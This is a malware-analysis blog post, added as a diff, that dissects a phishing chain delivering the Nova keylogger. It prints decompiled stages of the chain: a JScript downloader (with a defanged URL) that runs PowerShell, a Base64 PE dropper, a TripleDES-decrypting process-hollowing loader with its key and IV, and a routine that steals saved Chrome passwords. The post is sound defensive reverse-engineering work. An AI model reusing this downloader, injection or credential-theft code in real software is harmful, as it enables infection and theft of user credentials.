@@ -1,1 +1,521 @@
+---
+title: "Nova Analysis"
+categories:
+  - Malware Analysis
+toc: true
+---
 
+This blog details the steps taken in unravelling the stages associated with a Nova sample mentioned in my blog post on [Compromising Threat Actor Communications](https://polygonben.github.io/malware%20analysis/Compromising-Threat-Actor-Communications/). I thoroughly recommend checking this blog post out prior to reading this, for additional context. 
+
+Nova, which is a fork of the Snake Keylogger, was initially made public via a recent [Any.Run blog](https://any.run/cybersecurity-blog/nova-keylogger-malware-analysis/). I initially thought this sample was AgentTesla, due to incorrect attribution by VirusTotal - but further analysis revealed this not to be the case.   
+
+# Stage 1 (Email Attachment)
+
+This particular campaign began with a malicious phishing email, impersonating DHL. 
+
+The .eml file can be found on VirusTotal [here](https://www.virustotal.com/gui/file/3af579d5e612196cfa02d489f192b5c8c135556e39f0856b2e622dbe3f9002a1/detection).
+
+* Sender: `Noreplydhl[@]windhym[.]site`
+* DisplayName: `DHL Express Worldwide`
+* Subject: `DHL - Shipment Document // Arrival Notice - AWB 13700658****`
+* Attachment: `AWB DHL#84411.7z`
+
+[![1](/assets/images/Nova/1.png)](/assets/images/Nova/1.png){: .full}
+
+The malware itself is contained within the .7z attachment. We can see the attachment, `AWB DHL#84411.7z` (1fc37de1e469b72f89bd7624b4ffcbde), has many VT detections for "Trojan" & "Downloader".
+
+We can use the `7z` command-line tool to extract this, revealing it contains a singular file `chase.jse`.
+
+[![2](/assets/images/Nova/2.png)](/assets/images/Nova/2.png){: .full}
+
+# Stage 2 (chase.jse)
+
+We can see the 2nd stage, `chase.jse` (9a94ce2082740a534cf547af0a068102) is responsible for downloading another stage:
+
+```js
+// Constants to avoid magic strings
+var URL = "hXXps://files[.]catbox[.]moe/8e6thc.ps1";
+var DownloadPath = "C:\\Temp\\dddddd.ps1";
+var TEMP_DIR = "C:\\Temp";
+var SUCCESS_STATUS = 200;
+
+//[...REDACTED...]
+```
+
+This 3rd stage, `8e6thc.ps1`, was downloaded via the `DownloadScript()` function, that uses a defined `http` object:
+
+```js
+//[...REDACTETD...]
+var http = WScript.CreateObject("MSXML2.XMLHTTP");
+
+//[...REDACTED...]
+
+// Download the script securely
+function DownloadScript(url, path) {
+    http.Open("GET", url, false);
+    http.Send();
+
+    if (http.Status !== SUCCESS_STATUS) {
+        LogError("Download failed with status: " + http.Status);
+        return false;
+    }
+
+    try {
+        var file = fileSystem.CreateTextFile(path, true);
+        file.Write(http.ResponseText);
+        file.Close();
+        return true;
+    } catch (e) {
+        LogError("Error writing downloaded script: " + e.message);
+        return false;
+    }
+}
+//[...REDACTED...]
+```
+
+We can reference the [documentation](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms759148(v=vs.85)) to confirm this "MSXML2.XMLHTTP" object "provides client-side protocol support for communication with HTTP servers".
+
+Once this 3rd-stage is written to disk, it is executed using the `RunPowerShellScript()` function:
+
+```js
+//[...REDACTED...]
+var POWERSHELL_CMD = "PowerShell -NoProfile -ExecutionPolicy RemoteSigned -File ";
+
+//[...REDACTED...]
+
+// Execute PowerShell script
+function RunPowerShellScript(scriptPath) {
+    try {
+        var powerShellCommand = POWERSHELL_CMD + "\"" + scriptPath + "\"";
+        shell.Run(powerShellCommand, 0, true);
+    } catch (e) {
+        LogError("Failed to execute PowerShell script: " + e.message);
+    }
+}
+
+//[...REDACTED...]
+```
+
+# Stage 3 (8e6thc.ps1)
+
+I initially found this 3rd stage, `8e6thc.ps1` (466b9beeb51926c9d9ae9d538a2da037), via a RetroHunt query attempting to identify PowerShell scripts communicating with Telegram APIs. 
+
+Looking at the contents of this file, we can see it contains a massive chunk of Base64 text. I have redacted the majority to save space, but this is the remaining file:
+
+```js
+$p=[IO.Path]::Combine($env:TEMP,"x.exe")
+[IO.File]::WriteAllBytes($p,[Convert]::FromBase64String("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA[...REDACTED...]QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"))
+Start-Process $p
+```
+
+We can see here, the file `x.exe` will be written to disk, within the the directory `C:\Users\<username>\AppData\Local\temp`. The content of this `x.exe` is retrieved by the `FromBase64String()` function. We can see the `Start-Process` cmdlet is the used to run this `x.exe` binary. 
+
+We can either use [CyberChef](https://gchq.github.io/CyberChef/), or some command-line ninja magic to extract this PE:
+
+[![3](/assets/images/Nova/3.png)](/assets/images/Nova/3.png){: .full}
+
+Let's break this command down:
+
+1. `cat 8e6thc.ps1` - spits out the content of the .ps1 file
+2. `| grep -oE '[A-Za-z0-9+/]{50,}(==|=)?'` - from the above output, grep for a base64 string of text, 50+ characters long
+3. `| base64 -d` - from the above output, decode this base64
+4. `> stage4.bin` - write the contents of the base64 decoded content to a file `stage4.bin`
+
+From our `file` command we can see the resulting file is a `PE32 executable`, or a Windows Executable (expected as it was written to `x.exe`), and also `.NET` based - meaning it is trivial for us to decompile this.
+
+# Stage 4 (x.exe) 
+
+## Preliminary analysis
+
+### Detect It Easy
+
+We can open this binary, `stage4.bin` (40927121AE9707853F62FB9D896CC167) or `x.exe`,  within DiE:
+
+[![4](/assets/images/Nova/4.png)](/assets/images/Nova/4.png){: .full}
+
+We can see this is a 32-bit .NET binary, written in C#, using .NET Framework v4.8 with CLR v4.0.30319. This file does not appear to be packed, or using a well-known obfuscator. 
+
+### Strings
+
+Running strings reveals some interesting results like - `DecryptUsingTripleDES`, `AllocateMemoryForPayload`, `AllocateMemoryForPayload`, `CreateProcessA`, `InjectPayloadIntoProcess`, `VirtualAllocEx`, `WriteProcessMemory` & a massive chunk of base64 text. This may be indicative of process injection activity, but we will look into this shortly.
+
+### capa
+
+We can see running capa the below capabilities were discovered:
+
+[![5](/assets/images/Nova/5.png)](/assets/images/Nova/5.png){: .full}
+
+## .NET Source Code Analysis
+
+We this is a .NET binary, we can easily recover the source code using any .NET decompiler you like. I have used DNSpy for this. 
+
+### Program
+
+Going through the executable, we can see all the malicious activity is occcuring within the namespace `Program`. Here the functions `AdjustThreadContextForExecution()`, `AllocateMemoryForPayload()`, `DecryptData()`, `DecryptDataUsingTripleDES()`, `ExecutePayload()`, `InitializeProcessStartupInfo()`, `InjectPayloadIntoProcess()`, `ResumeThreadContext()`, `StartExecutableProcess()`, `WriteHeadersAndSectionsToMemory()`& `Main()` are all defined. 
+
+[![6](/assets/images/Nova/6.png)](/assets/images/Nova/6.png){: .full}
+
+#### Main()
+
+The Main method initializes three important elements:
+
+* A large Base64-encoded string (named text) that represents the encrypted payload.
+* A key and an initialization vector (IV) – also provided as Base64 strings.
+* It then calls `ExecutePayload()` with these parameters.
+
+```c#
+private static void Main(string[] args)
+    {
+      string text = "fK2NaQxHVYZVTAo+NeLyWNkL[...REDACTED...]";
+      byte[] array = Convert.FromBase64String("iA9B1uKFddQdqiLSSuzvD2GhL1o2Jv+v");
+      byte[] array2 = Convert.FromBase64String("b2CBFvcQeV4=");
+      Program.ExecutePayload(text, array, array2);
+    }
+```
+
+#### ExecutePayload()
+
+We can see in the Main() function, the 5th stage is executed via calling the `ExecutePayload()` function:
+
+```c#
+    private static void ExecutePayload(string encryptedData, byte[] key, byte[] iv)
+    {
+      byte[] array = Program.DecryptData(encryptedData, key, iv);
+      bool flag = array != null;
+      if (flag)
+      {
+        string text = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe");
+        Program.InjectPayloadIntoProcess(text, array);
+      }
+    }
+```
+
+Nice! We can see process injection is occuring here, which we'll get onto shortly, but prior to this - the payload is decrypted using the `DecryptData()` function.
+
+#### Payload Decryption 
+
+The functions `DecryptData()` & `DecryptUsingTripleDES()` are used to decrypt. 
+
+##### DecryptData()
+
+```c#
+    private static byte[] DecryptData(string encryptedData, byte[] key, byte[] iv)
+    {
+      byte[] array = Convert.FromBase64String(encryptedData);
+      return Program.DecryptUsingTripleDES(array, key, iv);
+    }
+```
+
+* DecryptData first converts the provided encrypted string from Base64 back into a byte array.
+
+##### DecryptUsingTripleDES()
+
+```c#
+    private static byte[] DecryptUsingTripleDES(byte[] cipherText, byte[] key, byte[] iv)
+    {
+      byte[] array;
+      using (TripleDES tripleDES = TripleDES.Create())
+      {
+        tripleDES.KeySize = 128;
+        tripleDES.BlockSize = 64;
+        tripleDES.Padding = PaddingMode.PKCS7;
+        tripleDES.Mode = CipherMode.CBC;
+        tripleDES.Key = key;
+        tripleDES.IV = iv;
+        using (ICryptoTransform cryptoTransform = tripleDES.CreateDecryptor(tripleDES.Key, tripleDES.IV))
+        {
+          using (MemoryStream memoryStream = new MemoryStream())
+          {
+            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write))
+            {
+              cryptoStream.Write(cipherText, 0, cipherText.Length);
+              cryptoStream.FlushFinalBlock();
+              array = memoryStream.ToArray();
+            }
+          }
+        }
+      }
+      return array;
+    }
+```
+
+* It then calls DecryptUsingTripleDES, which uses the TripleDES algorithm in CBC mode with PKCS7 padding to decrypt the payload using the provided key and IV.
+
+#### Process Injection
+
+We can see that Process Hollowing of the `RegAsm.exe` process is being performed here, which can be broken down into the following steps:
+
+* Choosing the Host Process: After decryption, the code builds the path to `RegAsm.exe` (a legitimate .NET assembly registration tool found in the runtime directory). This executable is used as a host for the injected payload.
+
+* Injection Routine (InjectPayloadIntoProcess):
+
+1) Process Creation: It first calls `InitializeProcessStartupInfo` and then uses `StartExecutableProcess` to create a new process in a suspended state. The use of `CreateProcessA` (wrapped inside the helper class BaseApp) indicates that the process is started with the intention of being manipulated before it begins execution.
+
+2) Setting Up Thread Context: It retrieves the current thread context of the suspended process with `SetupThreadContext`, which is necessary to later change the execution point (instruction pointer) to the injected code.
+
+3) Memory Allocation: The method `AllocateMemoryForPayload` uses `VirtualAllocEx` to reserve memory in the remote process. This memory will hold the payload.
+
+4) Writing the Payload: With `WriteHeadersAndSectionsToMemory`, the code copies the payload’s headers and section data into the allocated memory space of the target process. This involves parsing the PE (Portable Executable) format to locate the relevant parts.
+
+5) Adjusting Thread Context: The `AdjustThreadContextForExecution` method modifies the thread’s context (especially the instruction pointer) so that when execution resumes, it starts running from the injected payload instead of the original code.
+
+6) Resuming Execution: Finally, `ResumeThreadExecution` resumes the suspended process. Since the thread context was modified, the payload begins execution within the context of a legitimate process.
+
+## Stage 5 Decryption
+
+Having identified the method that was used to decrypt the 5th payload was Triple DES, and the recovering the hardcoded key & IV from the source code, we can decrypt this in CyberChef using [this recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Triple_DES_Decrypt(%7B'option':'Base64','string':'iA9B1uKFddQdqiLSSuzvD2GhL1o2Jv%2Bv'%7D,%7B'option':'Base64','string':'b2CBFvcQeV4%3D'%7D,'CBC','Raw','Raw'))
+
+[![7](/assets/images/Nova/7.png)](/assets/images/Nova/7.png){: .full}
+
+We can download this from CyberChef for further analysis.
+
+# Stage 5
+
+Now with this 5th stage, which happens to be the final stage, we can perform analysis and evaluate it's capabilities. 
+
+## Preliminary analysis
+
+### Detect It Easy
+
+We can open this binary, `stage5.bin` (ce66af0c99fa1f46b3457fef2064609a),  within DiE:
+
+[![8](/assets/images/Nova/8.png)](/assets/images/Nova/8.png){: .full}
+
+We can see this is a 32-bit .NET binary, written in C#, using .NET Framework v4.5 with CLR v4.0.30319. This file does not appear to be packed, or using a well-known obfuscator. 
+
+### strings
+
+Looking at the strings, we can see evidence that this is the infostealer we've been waiting for:
+
+```
+ / KEYLOGGER /
+KEYLOGGER.txt
+UserKeylogger.txt
+username_value
+password_value
+/ KEYLOGGER /
+KEYLOGGER.txt
+UserKeylogger.txt
+Application: Kinza
+=========================
+\Sputnik\Sputnik\User Data\Default\Login Data
+Application: Sputnik
+=========================
+Application: Falkon
+=========================
+\MapleStudio\ChromePlus\User Data\Default\Login Data
+Application: CoolNovo
+=========================
+\QIP Surf\User Data\Default\Login Data
+Application: QIP Surf
+=========================
+\BlackHawk\User Data\Default\Login Data
+Application: Black Hawk
+=========================
+\7Star\7Star\User Data\Default\Login Data
+Application: 7Star
+=========================
+APPDATA
+\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer\Default\Login Data
+Application: Sleipnir
+=========================
+\CatalinaGroup\Citrio\User Data\Default\Login Data
+Application: Citrio
+```
+
+
+### capa
+
+```
+┌─────────────┬────────────────────────────────────────────────────────────────────────────────────┐
+│ md5         │ ce66af0c99fa1f46b3457fef2064609a                                                   │
+│ sha1        │ be4697221f8bf26b86b97cf9c3fb1c9315a2fda4                                           │
+│ sha256      │ 629f2c765a1a5e73faa23f82d28b693f89b386900bac2eecf32be2b4bfee0776                   │
+│ analysis    │ static                                                                             │
+│ os          │ any                                                                                │
+│ format      │ dotnet                                                                             │
+│ arch        │ i386                                                                               │
+│ path        │ C:/Users/falcon/Desktop/AgentTesla/stage5.bin                                      │
+└─────────────┴────────────────────────────────────────────────────────────────────────────────────┘
+┌──────────────────────┬─────────────────────────────────────────────────────────────────────────────┐
+│ ATT&CK Tactic        │ ATT&CK Technique                                                            │
+├──────────────────────┼─────────────────────────────────────────────────────────────────────────────┤
+│ COLLECTION           │ Clipboard Data [T1115]                                                      │
+│                      │ Input Capture::Keylogging [T1056.001]                                       │
+│                      │ Screen Capture [T1113]                                                      │
+│ CREDENTIAL ACCESS    │ Credentials from Password Stores::Credentials from Web Browsers [T1555.003] │
+│ DEFENSE EVASION      │ Deobfuscate/Decode Files or Information [T1140]                             │
+│                      │ Obfuscated Files or Information [T1027]                                     │
+│ DISCOVERY            │ Account Discovery [T1087]                                                   │
+│                      │ File and Directory Discovery [T1083]                                        │
+│                      │ Process Discovery [T1057]                                                   │
+│                      │ Query Registry [T1012]                                                      │
+│                      │ System Information Discovery [T1082]                                        │
+│                      │ System Location Discovery [T1614]                                           │
+│                      │ System Location Discovery::System Language Discovery [T1614.001]            │
+│                      │ System Network Configuration Discovery [T1016]                              │
+│                      │ System Owner/User Discovery [T1033]                                         │
+│ EXECUTION            │ Shared Modules [T1129]                                                      │
+└──────────────────────┴─────────────────────────────────────────────────────────────────────────────┘
+┌─────────────────────────────┬────────────────────────────────────────────────────────────────────┐
+│ MBC Objective               │ MBC Behavior                                                       │
+├─────────────────────────────┼────────────────────────────────────────────────────────────────────┤
+│ COLLECTION                  │ Keylogging::Application Hook [F0002.001]                           │
+│                             │ Keylogging::Polling [F0002.002]                                    │
+│                             │ Screen Capture::WinAPI [E1113.m01]                                 │
+│ COMMAND AND CONTROL         │ C2 Communication::Send Data [B0030.001]                            │
+│ COMMUNICATION               │ HTTP Communication::Read Header [C0002.014]                        │
+│                             │ HTTP Communication::Set Header [C0002.013]                         │
+│ CRYPTOGRAPHY                │ Cryptographic Hash::MD5 [C0029.001]                                │
+│                             │ Decrypt Data [C0031]                                               │
+│                             │ Encrypt Data [C0027]                                               │
+│                             │ Generate Pseudo-random Sequence::Use API [C0021.003]               │
+│ DATA                        │ Decode Data::Base64 [C0053.001]                                    │
+│ DISCOVERY                   │ Application Window Discovery [E1010]                               │
+│                             │ File and Directory Discovery [E1083]                               │
+│                             │ System Information Discovery [E1082]                               │
+│ FILE SYSTEM                 │ Create Directory [C0046]                                           │
+│                             │ Delete Directory [C0048]                                           │
+│                             │ Delete File [C0047]                                                │
+│                             │ Read File [C0051]                                                  │
+│ OPERATING SYSTEM            │ Console [C0033]                                                    │
+│                             │ Registry::Query Registry Key [C0036.005]                           │
+│                             │ Registry::Query Registry Value [C0036.006]                         │
+│ PROCESS                     │ Create Thread [C0038]                                              │
+│                             │ Suspend Thread [C0055]                                             │
+│                             │ Terminate Process [C0018]                                          │
+└─────────────────────────────┴────────────────────────────────────────────────────────────────────┘
+┌───────────────────────────────────────────────────────┬──────────────────────────────────────────┐
+│ Capability                                            │ Namespace                                │
+├───────────────────────────────────────────────────────┼──────────────────────────────────────────┤
+│ get geographical location                             │ collection                               │
+│ save image in .NET                                    │ collection                               │
+│ gather chrome based browser login information         │ collection/browser                       │
+│ log keystrokes                                        │ collection/keylog                        │
+│ log keystrokes via application hook                   │ collection/keylog                        │
+│ log keystrokes via polling                            │ collection/keylog                        │
+│ capture screenshot                                    │ collection/screenshot                    │
+│ send data (2 matches)                                 │ communication                            │
+│ manipulate network credentials in .NET (5 matches)    │ communication/authentication             │
+│ get system web proxy                                  │ communication/http                       │
+│ read HTTP header (3 matches)                          │ communication/http                       │
+│ set HTTP header (3 matches)                           │ communication/http                       │
+│ decode data using Base64 in .NET (4 matches)          │ data-manipulation/encoding/base64        │
+│ encrypt or decrypt data via BCrypt                    │ data-manipulation/encryption             │
+│ encrypt data using DPAPI (3 matches)                  │ data-manipulation/encryption/dpapi       │
+│ hash data with MD5 (2 matches)                        │ data-manipulation/hashing/md5            │
+│ deserialize JSON in .NET (4 matches)                  │ data-manipulation/json                   │
+│ generate random numbers in .NET                       │ data-manipulation/prng                   │
+│ find data using regex in .NET                         │ data-manipulation/regex                  │
+│ load XML in .NET (2 matches)                          │ data-manipulation/xml                    │
+│ access .NET resource                                  │ executable/resource                      │
+│ read clipboard data                                   │ host-interaction/clipboard               │
+│ manipulate console buffer (2 matches)                 │ host-interaction/console                 │
+│ query environment variable                            │ host-interaction/environment-variable    │
+│ get common file path (42 matches)                     │ host-interaction/file-system             │
+│ create directory                                      │ host-interaction/file-system/create      │
+│ delete directory                                      │ host-interaction/file-system/delete      │
+│ delete file                                           │ host-interaction/file-system/delete      │
+│ check if directory exists (4 matches)                 │ host-interaction/file-system/exists      │
+│ check if file exists (41 matches)                     │ host-interaction/file-system/exists      │
+│ enumerate files in .NET (5 matches)                   │ host-interaction/file-system/files/list  │
+│ read file on Windows (2 matches)                      │ host-interaction/file-system/read        │
+│ get graphical window text                             │ host-interaction/gui/window/get-text     │
+│ get keyboard layout                                   │ host-interaction/hardware/keyboard       │
+│ allocate unmanaged memory in .NET (3 matches)         │ host-interaction/memory                  │
+│ manipulate unmanaged memory in .NET (9 matches)       │ host-interaction/memory                  │
+│ get hostname                                          │ host-interaction/os/hostname             │
+│ find process by name                                  │ host-interaction/process/list            │
+│ terminate process (2 matches)                         │ host-interaction/process/terminate       │
+│ terminate process by name in .NET                     │ host-interaction/process/terminate       │
+│ query or enumerate registry key (3 matches)           │ host-interaction/registry                │
+│ query or enumerate registry value (3 matches)         │ host-interaction/registry                │
+│ get session user name (5 matches)                     │ host-interaction/session                 │
+│ create thread (2 matches)                             │ host-interaction/thread/create           │
+│ suspend thread (2 matches)                            │ host-interaction/thread/suspend          │
+│ link function at runtime on Windows (2 matches)       │ linking/runtime-linking                  │
+│ unmanaged call (18 matches)                           │ runtime                                  │
+│ compiled to the .NET platform                         │ runtime/dotnet                           │
+└───────────────────────────────────────────────────────┴──────────────────────────────────────────┘
+```
+
+We can see this has a lot more capabilities, noteably, a large number of matches for `check if file exists`, and matches for `capture screenshot`, `log keystrokes `, `log keystrokes via application hook` & `gather chrome based browser login information` - all indicative of infostealing. 
+
+## .NET Source Code Analysis
+
+Due to the amount of code and capabilities of this stealer, I will not have the time to perform a deep-dive analysis of each section. I will highlight a few important points:
+
+### Configuration
+
+We can see the configuration of the malware is stored within the `UltraSpeed()` static constructor. 
+
+[![9](/assets/images/Nova/9.png)](/assets/images/Nova/9.png){: .full}
+
+Noteably, within the configuration there is capabilities to exfiltrate data over FTP, or Telegram - which has been used in this case. If you'd like to see how we can exploit the hardcoded Telegram bot tokens to steal the exfiltrated data (and discover the **stupid** TA responsible for this), I'd recommend checking [this blog](https://polygonben.github.io/malware%20analysis/Compromising-Threat-Actor-Communications/) out.
+
+### Capabilities
+
+From the `Start()` function within the `UltraSpeed` namespace, the each of the the functions to steal credentials are called. The functions themselves are stored within the `COVIDPickers` or `MozilSpeed` namespace. 
+
+[![10](/assets/images/Nova/10.png)](/assets/images/Nova/10.png){: .full}
+
+The majority of the functions within the `COVIDPickers` namespace, such as `Comodo_Speed()`, `CoolNovo_Speed()`, `CocCoc_Speed()`, `Brave_Speed()`, `Superbird_Speed()`, `SevinStar()`, ..., are all for Chromium-based browsers and extract credentials using an extremely similar method.
+
+
+#### Example Chromium Browser Credential Theft Source Code
+
+```c#
+public static void Chrome_Speed()
+{
+  string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
+  checked
+  {
+    try
+    {
+      bool flag = File.Exists(text);
+      if (flag)
+      {
+        SQLiteHandler sqliteHandler = new SQLiteHandler(text);
+        sqliteHandler.ReadTable("logins");
+        int num = sqliteHandler.GetRowCount() - 1;
+        for (int i = 0; i <= num; i++)
+        {
+          string value = sqliteHandler.GetValue(i, "origin_url");
+          string value2 = sqliteHandler.GetValue(i, "username_value");
+          string text2 = sqliteHandler.GetValue(i, "password_value");
+          bool flag2 = COVIDPickers.isV10(text2);
+          if (flag2)
+          {
+            byte[] masterKey = COVIDPickers.GetMasterKey(Directory.GetParent(text).Parent.FullName);
+            bool flag3 = masterKey == null;
+            bool flag4 = !flag3;
+            if (flag4)
+            {
+              text2 = COVIDPickers.DecryptWithKey(Encoding.Default.GetBytes(text2), masterKey);
+            }
+          }
+          else
+          {
+            text2 = COVIDPickers.Decrypttttt(Encoding.Default.GetBytes(sqliteHandler.GetValue(i, "password_value")));
+          }
+          bool flag5 = (Operators.CompareString(value2, "", false) != 0) & (Operators.CompareString(text2, "", false) != 0);
+          if (flag5)
+          {
+            string text3 = string.Concat(new string[] { "\r\n============X============\r\nURL: ", value, "\r\nUsername: ", value2, "\r\nPassword: ", text2, "\r\nApplication: Google Chrome\r\n=========================\r\n " });
+            UltraSpeed.PasswordVault += text3;
+          }
+        }
+      }
+    }
+    catch (Exception ex)
+    {
+    }
+  }
+}
+```
+
+# Conclusion
+
+As mentioned before, [Any.Run](https://any.run/cybersecurity-blog/nova-keylogger-malware-analysis/) initially coined this malware "Nova" and described it as "a newly discovered fork of the Snake Keylogger family. This variant has been observed employing even more sophisticated tactics, signaling the continued adaptation and persistence of the Snake malware family in the cybersecurity landscape". I'd encourage those who are interested to check out their blog, which describes a different execution chain. 
+
+Finally, in my other [blog post](https://polygonben.github.io/malware%20analysis/Compromising-Threat-Actor-Communications/), I detail how I stole the Telegram C2 communications associated with the above sample. These communications led to the discovery that the threat actor responsible for delivering this malware had tested the payload on his own machine and therefore insight was gained into the backend infrastructure behind this campaign and many others. 
